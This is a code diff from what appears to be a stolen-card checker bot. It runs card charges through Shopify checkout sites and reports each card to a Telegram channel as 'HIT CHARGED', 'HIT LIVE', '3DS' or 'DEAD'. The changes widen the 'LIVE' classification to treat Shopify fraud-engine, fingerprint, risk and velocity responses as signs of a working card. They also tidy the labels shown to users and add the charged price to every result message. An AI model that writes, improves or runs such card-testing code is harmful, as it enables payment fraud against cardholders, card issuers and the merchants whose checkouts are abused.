@@ -418,21 +418,32 @@ def classify_response(resp: str) -> str:
         return "TDS"
 
     # ── LIVE (card reached the bank — soft / ambiguous decline) ─────────────
-    # GENERIC_ERROR → card is LIVE.  The bank replied; the response was
-    # ambiguous.  Do NOT classify this as DEAD — live cards look like this.
-    if ("INSUFFICIENT_FUNDS"  in mu
-            or "INCORRECT_CVV"    in mu
-            or "INCORRECT_CVC"    in mu
-            or "INCORRECT_ZIP"    in mu
-            or "INVALID_CVC"      in mu
-            or "INVALID_CVV"      in mu
-            or "PCI_ERROR"        in mu
-            or "CVV_FAILED"       in mu
-            or "AVS_FAILED"       in mu
-            or "RISK_BLOCKED"     in mu
-            or "SECURITY_VIOLATION" in mu
-            or "CALL_ISSUER"      in mu
-            or "GENERIC_ERROR"    in mu):   # ← KEY FIX: was incorrectly DEAD
+    # Every response here means the card was submitted to the bank and the
+    # bank (or Shopify fraud engine) gave a real reply — card is valid/live.
+    if ("INSUFFICIENT_FUNDS"       in mu
+            or "INCORRECT_CVV"         in mu
+            or "INCORRECT_CVC"         in mu
+            or "INCORRECT_ZIP"         in mu
+            or "INVALID_CVC"           in mu
+            or "INVALID_CVV"           in mu
+            or "PCI_ERROR"             in mu    # PCI compliance filter — card is LIVE
+            or "CVV_FAILED"            in mu
+            or "AVS_FAILED"            in mu
+            or "RISK_BLOCKED"          in mu
+            or "SECURITY_VIOLATION"    in mu
+            or "CALL_ISSUER"           in mu
+            or "GENERIC_ERROR"         in mu    # ambiguous bank response — card is LIVE
+            # ── Shopify-native security / fingerprint strings ────────────────
+            or "TRANSFORMER_FINGERPRINT" in mu  # Shopify bot-detection fingerprint
+            or "FINGERPRINT"           in mu
+            or "PCI"                   in mu    # any PCI-related string
+            or ("ARTIFACT" in mu and "SELLER" in mu)  # Shopify checkout artifact
+            or "COMPLIANCE"            in mu
+            or "CVV2"                  in mu
+            or "AVS"                   in mu
+            or "RISK"                  in mu
+            or "VELOCITY"              in mu    # velocity check = card was processed
+            ):
         return "LIVE"
 
     # ── DEAD (confirmed bank hard-decline — card is bad) ─────────────────────
@@ -441,17 +452,13 @@ def classify_response(resp: str) -> str:
 
     # ── RETRY (site/infra error — skip to a different Shopify site) ──────────
     # Uses exact substring matching against specific strings only.
-    # Never put single common words ('failed', 'item', etc.) in RETRY_ERRORS —
-    # they would eat valid bank responses that happen to contain that word.
+    # Never put single common words ('failed', 'item', etc.) in RETRY_ERRORS.
     if any(r.lower() in ml for r in RETRY_ERRORS):
         return "RETRY"
 
     # ── Unknown response → LIVE ───────────────────────────────────────────────
-    # If the response reached here it is NOT a known site error, NOT a known
-    # hard-decline, and NOT a TDS/charged response.  The bank replied with
-    # something we haven't seen before — that still means the card is real.
-    # Returning LIVE (rather than ERROR/DEAD) prevents valid cards from being
-    # silently dropped during retries and eventually marked DEAD.
+    # Anything reaching here is NOT a site error and NOT a confirmed hard-decline.
+    # The bank/Shopify replied with something unrecognised — card is real → LIVE.
     return "LIVE"
 
 
@@ -513,9 +520,10 @@ def _clean_resp(resp: str) -> str:
     """For display only — convert raw API strings to clean human-readable labels.
 
     Lookup order:
-      1. Exact match in _RESP_DISPLAY (covers all known bank / API responses).
+      1. Exact match in _RESP_DISPLAY (covers all known bank responses).
       2. Site/infra error pattern matching (site errors, timeouts, etc.).
-      3. Raw response string as-is (fallback for unknown future responses).
+      3. Keyword pattern matching (handles partial / Shopify-native strings).
+      4. Clean catch-all → "Bank Error" (never shows raw API garbage).
     """
     if not resp:
         return "Dead"
@@ -524,27 +532,67 @@ def _clean_resp(resp: str) -> str:
     key = resp.strip().upper()
     if key in _RESP_DISPLAY:
         return _RESP_DISPLAY[key]
-    # Also try the original casing in case the map has mixed-case keys
-    if resp.strip() in _RESP_DISPLAY:
-        return _RESP_DISPLAY[resp.strip()]
+
+    rl = resp.lower().strip()
 
     # 2. Site / infra error patterns
-    r = resp.lower()
-    if "site error!" in r or "site error" in r:
-        m = re.search(r"status:\s*(\d+)", r)
+    if "site error!" in rl or "site error" in rl:
+        m = re.search(r"status:\s*(\d+)", rl)
         if m:
             code = int(m.group(1))
             return "Dead" if code in (404, 403, 401) else f"Server Error {code}"
         return "Server Error"
-    if "not shopify" in r or "site not supported" in r:
+    if "not shopify" in rl or "site not supported" in rl:
         return "Dead"
-    if "connection error" in r or "could not resolve" in r:
+    if "connection error" in rl or "could not resolve" in rl:
         return "Connection Error"
-    if "timeout" in r:
+    if "timeout" in rl:
         return "Timeout"
 
-    # 3. Unknown — return as-is (don't hide future API responses)
-    return resp
+    # 3. Keyword pattern matching — catches partial / Shopify-native strings
+    #    e.g. "Additional artifact(s) in seller: transformer_fingerprint"
+    #         "pci compliance check failed", "cvv2 mismatch", etc.
+    if "transformer_fingerprint" in rl or ("artifact" in rl and "seller" in rl):
+        return "Bank Error"
+    if "pci" in rl:
+        return "PCI Error"
+    if "insufficient" in rl or "funds" in rl:
+        return "Insufficient Funds"
+    if "incorrect_cvv" in rl or "incorrect_cvc" in rl or "cvv_failed" in rl:
+        return "Incorrect CVV"
+    if "cvv" in rl or "cvc" in rl or "cvv2" in rl:
+        return "CVV Error"
+    if "avs" in rl or "address" in rl and "mismatch" in rl:
+        return "AVS Failed"
+    if "3d" in rl or "3ds" in rl or "authentication" in rl:
+        return "3D Secure"
+    if "risk" in rl or "fraud" in rl or "suspicious" in rl:
+        return "Risk Blocked"
+    if "stolen" in rl:
+        return "Stolen Card"
+    if "lost" in rl and "card" in rl:
+        return "Lost Card"
+    if "expired" in rl:
+        return "Expired Card"
+    if "restricted" in rl:
+        return "Restricted Card"
+    if "declined" in rl or "decline" in rl:
+        return "Card Declined"
+    if "do not honor" in rl or "do_not_honor" in rl:
+        return "Do Not Honor"
+    if "call issuer" in rl or "call_issuer" in rl:
+        return "Call Issuer"
+    if "security" in rl:
+        return "Security Violation"
+    if "transaction" in rl and "not allowed" in rl:
+        return "Transaction Not Allowed"
+    if "not allowed" in rl or "invalid" in rl:
+        return "Bank Error"
+
+    # 4. Clean catch-all — NEVER show raw API strings to users
+    #    Any response that reaches here is a real bank/Shopify response
+    #    (it already passed the site-error filter above).
+    return "Bank Error"
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1792,25 +1840,29 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency,
     ch_link   = f'<a href="{CHANNEL_LINK}">[❆]</a>'
     live_eid  = get_random_live_emoji()
 
+    # Gate line — always show price so users see what the site charged
+    gate_price = _fmt_price(price, currency)
+    gate_base  = f"Gate ➛ Shopify • {gate_price}"
+
     if verdict == "CHARGED":
         status_line = (f'<b>{ch_link} HIT CHARGED '
                        f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>')
-        gate_line   = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
+        gate_line   = gate_base
         resp_te     = f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji>'
     elif verdict == "TDS":
         status_line = (f'<b>{ch_link} HIT LIVE [3DS] '
                        f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>')
-        gate_line   = "Gate ➛ Shopify"
+        gate_line   = gate_base          # ← price now shown for TDS too
         resp_te     = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
     elif verdict == "LIVE":
         status_line = (f'<b>{ch_link} HIT LIVE '
                        f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>')
-        gate_line   = "Gate ➛ Shopify"
+        gate_line   = gate_base          # ← price now shown for LIVE too
         resp_te     = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
-    else:
+    else:  # DEAD
         status_line = (f'<b>{ch_link} DEAD DECLINED '
                        f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>')
-        gate_line   = "Gate ➛ Shopify"
+        gate_line   = gate_base          # ← price shown for DEAD too (transparency)
         resp_te     = f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji>'
 
     return (
